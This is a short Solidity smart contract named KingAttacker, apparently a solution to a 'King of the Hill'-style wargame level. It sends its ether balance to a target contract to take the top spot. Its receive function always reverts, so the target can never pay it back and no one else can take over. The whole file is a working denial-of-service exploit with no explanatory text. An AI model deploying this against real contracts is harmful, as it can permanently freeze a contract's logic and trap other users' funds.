// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address payable private target;

    constructor(address payable _target) {
        target = _target;
    }

    function beTheKing() external payable {
        (bool sent, ) = target.call{value: address(this).balance}("");
        require(sent, "send failed");
    }

    receive() external payable {
        revert("nah");
    }
}
